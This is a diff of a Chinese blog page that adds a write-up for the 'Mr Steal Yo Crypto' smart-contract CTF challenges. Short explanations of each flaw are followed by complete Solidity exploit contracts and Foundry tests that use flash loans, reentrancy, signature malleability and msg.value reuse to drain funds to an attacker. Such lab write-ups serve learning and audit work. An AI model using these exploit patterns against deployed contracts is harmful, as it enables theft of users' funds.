@@ -5,7 +5,10 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="Mr Steal Yo Crypto-下, Blog">
-    <meta name="description" content="Mr Steal Yo Crypto-下">
+    <meta name="description" content="Mr Steal Yo Crypto-下Bonding CurveBancorBondingCurve.sol
+这个合约用来表示债券曲线。
+EminenceCurrencyHelpers.sol
+这个合约中的ContinuousToken合">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -343,21 +346,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-09-08
+                    2023-09-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5
+                    2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    10 分
                 </div>
                 
 
@@ -377,7 +380,452 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Mr-Steal-Yo-Crypto-下"><a href="#Mr-Steal-Yo-Crypto-下" class="headerlink" title="Mr Steal Yo Crypto-下"></a>Mr Steal Yo Crypto-下</h1>
+                <h1 id="Mr-Steal-Yo-Crypto-下"><a href="#Mr-Steal-Yo-Crypto-下" class="headerlink" title="Mr Steal Yo Crypto-下"></a>Mr Steal Yo Crypto-下</h1><h2 id="Bonding-Curve"><a href="#Bonding-Curve" class="headerlink" title="Bonding Curve"></a>Bonding Curve</h2><p>BancorBondingCurve.sol</p>
+<p>这个合约用来表示债券曲线。</p>
+<p>EminenceCurrencyHelpers.sol</p>
+<p>这个合约中的ContinuousToken合约时核心，用来实现代币。</p>
+<p>EminenceCurrencyBase.sol</p>
+<p>这个合约为EMN ERC20。它有用DAI购买或出售EMN代币的方法。当出售EMN代币时，合约会先销毁EMN代币。</p>
+<p>EminenceCurrency.sol</p>
+<p>这个合约为TOKEN ERC20。它有用EMN购买或出售TOKEN代币的方法。当出售TOKEN代币时，合约会先销毁TOKEN代币。与EminenceCurrencyBase.sol不同的是购买TOKEN时是调用EMN的claim()方法。</p>
+<p>这意味着EminenceCurrency的变化似乎会影响EminenceCurrencyBase的债券曲线，但反之则不然。那么当我们购买TOKEN时，会导致DAI/EMN下降。这时我们可以出售手中的EMN套利，但不影响EMN/TOKEN。</p>
+<pre><code>contract Exploit{
+
+    address owner;
+    IUniswapV2Pair uniPair; 
+    IWETH weth;
+    Token usdc;
+    Token dai;
+    IEminenceCurrency eminenceCurrencyBase;
+    IEminenceCurrency eminenceCurrency;
+
+    constructor(address _dai, address _eminenceCurrencyBase, address _eminenceCurrency, address _uniPair ){
+        owner = msg.sender;
+        dai = Token(_dai);
+        eminenceCurrencyBase = IEminenceCurrency(_eminenceCurrencyBase);
+        eminenceCurrency = IEminenceCurrency(_eminenceCurrency);
+        uniPair = IUniswapV2Pair(_uniPair);
+    }
+
+    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
+        uint256 daiAmount = dai.balanceOf(address(this));
+
+        dai.approve(address(eminenceCurrencyBase), type(uint).max);
+        eminenceCurrencyBase.approve(address(eminenceCurrency), type(uint).max);
+
+        eminenceCurrencyBase.buy(daiAmount, 0);
+        uint256 eminenceCurrencyBaseAmount = eminenceCurrencyBase.balanceOf(address(this));
+
+        uint256 amount_ = eminenceCurrencyBaseAmount / 2;
+        eminenceCurrency.buy(amount_, 0);
+
+        eminenceCurrencyBase.sell(amount_, 0);
+
+        uint256 eminenceCurrencyAmount = eminenceCurrency.balanceOf(address(this));
+        eminenceCurrency.sell(eminenceCurrencyAmount, 0);
+        eminenceCurrencyBaseAmount = eminenceCurrencyBase.balanceOf(address(this));
+        eminenceCurrencyBase.sell(eminenceCurrencyBaseAmount, 0);
+
+        dai.transfer(address(uniPair), (amount1Out * 103 / 100) + 1);
+        dai.transfer(owner, dai.balanceOf(address(this)));
+    }
+
+    function pwn() external {
+        uniPair.swap(0, 999_999e18, address(this), new bytes(1));
+    }
+}
+</code></pre>
+<h2 id="Flash-Loaner"><a href="#Flash-Loaner" class="headerlink" title="Flash Loaner"></a>Flash Loaner</h2><p>通常，当合约有闪电贷功能时，要有一个重入检查，防止使用协议内的金额。但这个合约没有。</p>
+<p>那么我们就能闪贷一资金，再deposit()，这样我们只要付一点手续费就能得到巨额的share token。</p>
+<pre><code>contract Attack {
+    FlashLoaner flashLoaner;
+    Token usdc;
+    IUniswapV2Pair uniPair;
+    address private attacker;
+
+    constructor(address _target, address _usdc, address _uniPair){
+        flashLoaner = FlashLoaner(_target);
+        usdc = Token(_usdc);
+        uniPair = IUniswapV2Pair(_uniPair);
+        attacker = msg.sender;
+        usdc.approve(address(flashLoaner), type(uint).max);
+    }
+
+    function flashCallback(uint256 fee, bytes calldata data) external {
+        flashLoaner.deposit(100_000e18, address(this));
+        usdc.transfer(address(flashLoaner), fee); 
+    }
+
+    
+    function uniswapV2Call(address _address, uint amount0Out, uint amount1Out, bytes memory data) external {
+        flashLoaner.flash(address(this), usdc.balanceOf(address(flashLoaner)) - 1, new bytes(0));
+        flashLoaner.redeem(flashLoaner.balanceOf(address(this)), address(this), address(this));
+        usdc.transfer(address(uniPair), (amount0Out * 103 / 100) + 1);
+    }
+
+    function pwn() external {
+        uniPair.swap(10_000e18, 0, address(this), new bytes(1));
+        usdc.transfer(attacker, usdc.balanceOf(address(this)));
+    }
+}
+</code></pre>
+<h2 id="Safu-Swapper"><a href="#Safu-Swapper" class="headerlink" title="Safu Swapper"></a>Safu Swapper</h2><p>safu Pool在添加流动性用的baseAmount，tokenAmount计算，移除流动性时却用amount = IERC20(token).balanceOf(pool);<br>而且在我们以transfer转入代币时合约不会更新baseAmount，tokenAmount。</p>
+<pre><code>pragma solidity ^0.8.4;
+import {console} from "forge-std/console.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+interface IUniswapV2Pair {
+    function swap(
+        uint amount0Out, 
+        uint amount1Out, 
+        address to, 
+        bytes calldata data
+    ) external;
+}
+
+interface ISafuPool {
+    function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) external returns (uint);
+    function swap(address toToken, uint256 amount) external returns (uint);
+    function removeAllLiquidity() external returns (uint, uint);
+    function approve(address, uint256) external returns (bool);
+    function balanceOf(address addr) external returns (uint256);
+    function totalSupply() external returns (uint256);
+}
+
+contract Attack {
+
+    IUniswapV2Pair pair;
+    ISafuPool safuPool;
+    IERC20 usdc;
+    IERC20 safu;
+
+    function attack(
+        address _uniswapPair, 
+        address _safuPool,
+        address _usdc,
+        address _safu,
+        uint256 amount 
+    ) external {
+        pair = IUniswapV2Pair(_uniswapPair);
+        safuPool = ISafuPool(_safuPool);
+        usdc = IERC20(_usdc);
+        safu = IERC20(_safu);
+
+        usdc.approve(address(safuPool),type(uint256).max);
+        safu.approve(address(safuPool),type(uint256).max);
+
+        pair.swap(amount,0,address(this),bytes('not empty'));
+    }
+
+    function uniswapV2Call(
+        address _sender, 
+        uint256 _amount0, 
+        uint256 _amount1,
+        bytes calldata _data
+    ) external {
+
+        for (uint i=0; i&lt;5; ++i) {
+            safuPool.swap(address(safu),8_000*1e18); 
+        }
+
+        uint256 safuAmount = safu.balanceOf(address(this));
+        safuPool.addLiquidity(safuAmount, safuAmount); 
+        uint t = safuPool.balanceOf(address(this));
+        console.log("My lp :", t);
+        t = safuPool.totalSupply();
+        console.log("My lp :", t);
+
+
+        for (uint i=0; i&lt;5; ++i) {
+            safuPool.swap(address(safu),8_000*1e18); 
+        }
+
+        safuAmount = safu.balanceOf(address(this));
+        safu.transfer(address(safuPool),safuAmount); 
+        usdc.transfer(address(safuPool),600_000*1e18); 
+
+        safuPool.removeAllLiquidity(); 
+        safuPool.addLiquidity(0,0); 
+        safuPool.removeAllLiquidity(); 
+        uint256 amountPerRound = safu.balanceOf(address(this))
+
+        for (uint i=0; i&lt;10; ++i) {
+            safuPool.swap(address(usdc), amountPerRound);
+        }
+
+        uint256 loanPlusInterest = (_amount0*(10**18)*1000/997/(10**18))+1; 
+        usdc.transfer(msg.sender,loanPlusInterest);
+        usdc.transfer(tx.origin,usdc.balanceOf(address(this)));
+    }
+
+}
+</code></pre>
+<h2 id="Side-Entrance"><a href="#Side-Entrance" class="headerlink" title="Side Entrance"></a>Side Entrance</h2><p>合约为了方便期权买家去行使期权，提供了Uniswap闪电贷，但是合约并未对pair审查。与Free Lunch一样我们为什么不建一个Mytoken(受我们控制)-usdc的Pool呢？</p>
+<pre><code>contract Exploit {
+
+    address owner;
+    Token MyToken;
+    Token usdc;
+    IUniswapV2Factory uniFactory;
+    IUniswapV2Router02 uniRouter;
+    IUniswapV2Pair usdcMyTokenPair;
+    IUniswapV2Pair usdcDaiPair;
+    CallOptions optionsContract;
+
+    constructor(address attacker, address _optionsContract, address _factory, address _router, address _usdc, address _usdcDaiPair) {
+        owner = attacker;
+        optionsContract = CallOptions(_optionsContract);
+        MyToken = new Token('My ', 'My ');
+        MyToken.mint(address(this), 1_000_000e18);
+        uniRouter = IUniswapV2Router02(_router);
+        uniFactory = IUniswapV2Factory(_factory);
+        usdcDaiPair = IUniswapV2Pair(_usdcDaiPair);
+        usdc = Token(_usdc);
+        usdc.approve(address(uniRouter), type(uint).max);
+        MyToken.approve(address(uniRouter), type(uint).max);
+    }
+
+    function uniswapV2Call(address _address, uint amount0Out, uint amount1Out, bytes memory data) external {
+        uniRouter.addLiquidity(address(usdc), address(MyToken), usdc.balanceOf(address(this)), MyToken.balanceOf(address(this)), 0, 0, address(this), block.timestamp);
+        usdcMyTokenPair = IUniswapV2Pair(uniFactory.getPair(address(usdc), address(MyToken)));
+
+        address to = abi.decode(data, (address));
+        bytes32 optionId = optionsContract.getLatestOptionId();
+        uint256 interestAmount = usdc.balanceOf(address(to));
+
+        bytes memory _calldata = abi.encode(optionId, to, interestAmount);
+        usdcMyTokenPair.swap(2_100e18, 0, address(optionsContract), _calldata);
+
+        usdcMyTokenPair.approve(address(uniRouter), type(uint).max);
+        uniRouter.removeLiquidity(address(usdc), address(MyToken), usdcMyTokenPair.balanceOf(address(this))-1, 0, 0, address(this), block.timestamp);
+
+        usdc.transfer(address(usdcDaiPair), (amount0Out * 103 / 100) + 1);
+        usdc.transfer(owner, usdc.balanceOf(address(this)));
+    }
+
+    function pwn(address target) external {
+        bytes memory _calldata = abi.encode(target);
+        usdcDaiPair.swap(3_000e18, 0, address(this), _calldata);
+    }
+}
+</code></pre>
+<h2 id="Malleable"><a href="#Malleable" class="headerlink" title="Malleable"></a>Malleable</h2><p>本题需要你对圆锥曲线算法有一定的了解。</p>
+<p>简单来说就是r,s代表曲线上一点，r为x坐标，s为y坐标。但由于对称，s可为正负。<br>这时用v来判断这一点在1，2象限还是3，4象限。</p>
+<pre><code> /// solves the challenge
+    function testChallengeExploit() public {
+        vm.startPrank(attacker,attacker);
+
+        uint8 v_ = v == 27 ? 28 : 27;
+        bytes32 s_ = bytes32(
+            uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - 
+            uint256(s)
+        );
+
+        treasureVault.sendFundsWithAuth(1e18,0,v_,r,s_);
+
+        vm.stopPrank();
+        validation();
+    }
+</code></pre>
+<h2 id="Extractoor"><a href="#Extractoor" class="headerlink" title="Extractoor"></a>Extractoor</h2><p>通过阅读合约，发现只有withdrawTokens()，finalize()，commitEth()能转移ETH，其中withdrawTokens()，finalize()只有owner才能调用。似乎我只有commitEth()可用。</p>
+<p>commitEth()用来接收保证金，并退多的。</p>
+<p>当合约使用msg.value计算时，要防止被循环调用。但很遗憾这个没有做到。它为我们提供了一个循环调用的方法multicall()。</p>
+<pre><code>/// solves the challenge
+function testChallengeExploit() public {
+    vm.startPrank(attacker, attacker);
+
+    bytes memory call = abi.encodeWithSignature("commitEth(address)", attacker);
+    bytes[] memory _data = new bytes[](11);
+    for (uint i; i &lt; 11; i++) {
+        _data[i] = call;
+    }
+    
+    dutchAuction.multicall{value: 100e18}(_data);
+
+    vm.stopPrank();
+    validation();
+}
+</code></pre>
+<h2 id="Opyn-Sesame"><a href="#Opyn-Sesame" class="headerlink" title="Opyn Sesame"></a>Opyn Sesame</h2><p>OptionsContract.sol </p>
+<p>它实现了OptionLogic.sol的逻辑。</p>
+<p>OptionsMarket.sol </p>
+<p>期权市场，用来实现购买期权的功能。</p>
+<p>OptionLogic.sol</p>
+<p>编写了构造期权，使用期权的逻辑功能。</p>
+<p>发现了吗？为了方便，它用exercise()去打包实现_exercise()。它犯了与Extractoor一样的错误！</p>
+<pre><code>// solves the challenge
+function testChallengeExploit() public {
+    vm.startPrank(attacker, attacker);
+
+    usdc.approve(address(optionsMarket), 500e18);
+
+    optionsMarket.purchase(5e18);
+
+    optionsContract.exercise{value: 1 ether}(5e18, addresses);
+
+    vm.stopPrank();
+    validation();
+}
+</code></pre>
+<h2 id="Degen-Jackpot"><a href="#Degen-Jackpot" class="headerlink" title="Degen Jackpot"></a>Degen Jackpot</h2><p>当我们通过depositAdditionalToFNFT()方法去创建新NFT是NFT的id是在我们输入的id上加1，这是一个错误的手段，<br>因为它可能不是创建新NFT，而是已有的。这会导致已有的NFT价格改变。</p>
+<pre><code>contract RevestExploiter is ERC1155Receiver {
+
+    IERC20 gov;
+    IRevest revest;
+    address attacker;
+    bool triggerCallback;
+
+    constructor(address revestAddress, address govAddress) {
+        revest = IRevest(revestAddress);
+        attacker = msg.sender;
+        gov = IERC20(govAddress);
+        gov.approve(revestAddress, 1e18);
+    }
+
+    function setTrigger(bool _trigger) external {
+        triggerCallback = _trigger;
+    }
+
+    function onERC1155Received(
+        address operator,
+        address from,
+        uint256 id,
+        uint256 value,
+        bytes calldata data
+    ) external override returns (bytes4) {
+        if (triggerCallback) {
+            triggerCallback=false;
+            revest.depositAdditionalToFNFT(1, 1e18, 1); 
+            revest.withdrawFNFT(2, 100_001); 
+            gov.transfer(attacker,gov.balanceOf(address(this))); 
+        }
+
+        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
+    }
+
+    function onERC1155BatchReceived(
+        address operator,
+        address from,
+        uint256[] calldata ids,
+        uint256[] calldata values,
+        bytes calldata data
+    ) external override returns (bytes4) {
+        return bytes4(0);
+    }
+
+}
+</code></pre>
+<pre><code>/// solves the challenge
+    function testChallengeExploit() public {
+        vm.startPrank(attacker,attacker);
+
+        RevestExploiter exploiter = new RevestExploiter(address(revest),address(gov));
+
+        address[] memory recipients = new address[](1);
+        recipients[0]=address(exploiter);
+        uint256[] memory quantities = new uint256[](1);
+        quantities[0]=2;
+        bytes memory arguments;
+
+        IRevest.FNFTConfig memory fnftConfig;
+        fnftConfig.asset = address(gov);
+
+        revest.mintAddressLock( 
+            address(exploiter),
+            arguments,
+            recipients,
+            quantities,
+            fnftConfig
+        );
+
+        gov.transfer(address(exploiter),1e18);
+        exploiter.setTrigger(true);
+
+        quantities[0]=100_001;
+
+        revest.mintAddressLock(
+            address(exploiter),
+            arguments,
+            recipients,
+            quantities,
+            fnftConfig
+        );
+
+        vm.stopPrank();
+        validation();
+    }
+</code></pre>
+<h2 id="Safu-Lender"><a href="#Safu-Lender" class="headerlink" title="Safu Lender"></a>Safu Lender</h2><p>首先让我们了解一ERC777与ERC20的差异。当在ERC20中transfer与mint会给与caller去操作的空间。</p>
+<p>显然当使用ERC777要保证caller可信，与先改变状态再执行的模式。</p>
+<pre><code>  err = doTransferOut(asset, msg.sender, localResults.withdrawAmount);
+        if (err != Error.NO_ERROR) {
+            // This is safe since it's our first interaction and it didn't do anything if it failed
+            return fail(err, FailureInfo.WITHDRAW_TRANSFER_OUT_FAILED);
+        }
+
+        // Save market updates
+        market.blockNumber = getBlockNumber();
+        market.totalSupply =  localResults.newTotalSupply;
+        market.supplyRateMantissa = localResults.newSupplyRateMantissa;
+        market.supplyIndex = localResults.newSupplyIndex;
+        market.borrowRateMantissa = localResults.newBorrowRateMantissa;
+        market.borrowIndex = localResults.newBorrowIndex;
+
+        // Save user updates
+        localResults.startingBalance = supplyBalance.principal;
+        supplyBalance.principal = localResults.userSupplyUpdated;
+        supplyBalance.interestIndex = localResults.newSupplyIndex;
+</code></pre>
+<p>很遗憾的是，此合约并没有做到。那我们可以进行重入攻击。</p>
+<pre><code>contract Attack {
+    address owner;
+    IUniswapV2Pair usdcBtcPair;
+    IWETH weth;
+    Token usdc;
+    Token777 wbtc;
+    IMoneyMarket moneyMarket;
+
+    constructor(address _wbtc, address _moneyMarket, address _usdcBtcPair) {
+        owner = msg.sender;
+        wbtc = Token777(_wbtc);
+        moneyMarket = IMoneyMarket(_moneyMarket);
+        usdcBtcPair = IUniswapV2Pair(_usdcBtcPair);
+        wbtc.approve(address(moneyMarket), type(uint).max);
+        wbtc.approve(address(usdcBtcPair), type(uint).max);
+        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
+    }
+
+    function uniswapV2Call(address _address, uint amount0Out, uint amount1Out, bytes memory data) external {
+        uint256 wbtcAmount = wbtc.balanceOf(address(this));
+    
+        moneyMarket.supply(address(wbtc), amount1Out);
+
+        moneyMarket.withdraw(address(wbtc), amount1Out);
+
+        wbtc.transfer(address(usdcBtcPair), (amount1Out * 103 / 100) + 1);
+        wbtc.transfer(owner, wbtc.balanceOf(address(this)));
+        
+    }
+
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external {
+        if (wbtc.balanceOf(address(moneyMarket)) &gt;= 1e18) {
+            moneyMarket.withdraw(address(wbtc), amount);
+        }
+    }
+
+    function pwn() external {
+        usdcBtcPair.swap(0, 10e18, address(this), new bytes(1));
+    }
+}
+</code></pre>
+
                 
             </div>
             <hr/>
@@ -840,7 +1288,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">8.3k</span>
+                        class="white-color">10.8k</span>
             
             
             
